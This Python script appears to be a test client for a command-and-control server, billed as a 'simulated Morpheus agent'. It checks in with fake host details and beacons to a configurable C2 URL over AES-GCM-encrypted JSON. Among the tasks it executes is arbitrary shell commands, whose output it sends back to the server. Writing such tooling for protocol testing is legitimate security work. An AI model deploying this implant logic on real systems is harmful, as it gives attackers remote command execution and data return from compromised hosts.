#!/usr/bin/env python3
"""
Simulated Morpheus Agent for protocol testing on Linux.
Uses a pre-shared AES key matching the C2 server.
"""

import json
import base64
import uuid as uuid_mod
import os as pyos
import time
import subprocess
import sys
import urllib.request

C2_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("pip install cryptography")
    sys.exit(1)

# Load pre-shared key
TEST_KEY_FILE = "/workspace/test_key.txt"
KEY = None
if pyos.path.exists(TEST_KEY_FILE):
    with open(TEST_KEY_FILE) as f:
        KEY = base64.b64decode(f.read().strip())
else:
    KEY = pyos.urandom(32)

AGENT_UUID = str(uuid_mod.uuid4())


def encrypt_message(key, plaintext):
    nonce = pyos.urandom(12)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ciphertext).decode()


def decrypt_message(key, encrypted_b64):
    raw = base64.b64decode(encrypted_b64)
    nonce, ciphertext = raw[:12], raw[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)


def post(action, data):
    global KEY, AGENT_UUID
    payload = json.dumps(data).encode()
    encrypted = encrypt_message(KEY, payload)
    envelope = {"message": encrypted, "uuid": AGENT_UUID}
    body = json.dumps(envelope).encode()

    req = urllib.request.Request(C2_URL, data=body,
                                  headers={"Content-Type": "application/json"})
    resp = urllib.request.urlopen(req)
    resp_data = resp.read()

    if not resp_data:
        return None
    resp_env = json.loads(resp_data)
    if "message" in resp_env:
        dec = decrypt_message(KEY, resp_env["message"])
        return json.loads(dec)
    return resp_env


def checkin():
    global KEY
    checkin_data = {
        "action": "checkin",
        "uuid": AGENT_UUID,
        "os": "Windows 10.0.19045",
        "user": "DESKTOP-TEST\\user",
        "host": "DESKTOP-TEST",
        "pid": 4242,
        "ip": "192.168.1.100",
        "architecture": "x64",
        "domain": "WORKGROUP",
        "integrity_level": 2,
        "encryption_key": base64.b64encode(KEY).decode(),
        "decryption_key": base64.b64encode(KEY).decode(),
    }
    resp = post("checkin", checkin_data)
    print(f"[i] Checkin response: {resp.get('status', '?')}")
    return resp


def run_shell(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                       timeout=10).decode()
    except Exception as e:
        return str(e)


def execute_task(task):
    command = task["command"]
    params = json.loads(task.get("params", "{}"))
    result = {"status": "success", "completed": True, "task_uuid": task["uuid"]}

    print(f"  [*] Executing: {command}")

    if command == "shell":
        result["user_output"] = run_shell(params.get("command", "whoami"))
    elif command == "pwd":
        result["user_output"] = pyos.getcwd()
    elif command == "whoami":
        try:
            import pwd
            result["user_output"] = f"user={pwd.getpwuid(pyos.getuid()).pw_name}\n"
        except Exception:
            result["user_output"] = f"user=uid_{pyos.getuid()}\n"
    elif command == "hostname":
        import socket
        result["user_output"] = socket.gethostname()
    elif command == "ps":
        try:
            result["user_output"] = subprocess.check_output(
                ["ps", "aux"], timeout=5).decode()
        except Exception:
            result["user_output"] = "ps output\n"
    elif command == "ls":
        path = params.get("path", ".")
        try:
            result["user_output"] = "\n".join(pyos.listdir(path))
        except Exception as e:
            result["user_output"] = str(e)
    elif command == "sleep":
        result["user_output"] = f"sleep updated to {params.get('interval', 5)}s"
    elif command == "exit":
        result["user_output"] = "exiting"
    else:
        result["user_output"] = f"Unknown command: {command}"
        result["status"] = "error"

    return result


def main():
    print(f"[*] Simulated Morpheus Agent starting...")
    print(f"[*] UUID: {AGENT_UUID[:16]}...")
    print(f"[*] C2: {C2_URL}")

    checkin()
    time.sleep(1)

    for i in range(3):
        print(f"\n--- Beacon Cycle {i+1} ---")
        tasks = post("get_tasking", {"action": "get_tasking", "uuid": AGENT_UUID})

        if tasks and "tasks" in tasks and tasks["tasks"]:
            for task in tasks["tasks"]:
                result = execute_task(task)
                post("post_response", {
                    "action": "post_response",
                    "uuid": AGENT_UUID,
                    "task_uuid": result["task_uuid"],
                    "user_output": result.get("user_output", ""),
                    "completed": result["completed"],
                    "status": result["status"],
                })
                time.sleep(0.5)
        else:
            print("  [i] No tasks received")

        time.sleep(2)

    print("\n[*] Test complete. Agent exiting.")


if __name__ == "__main__":
    main()
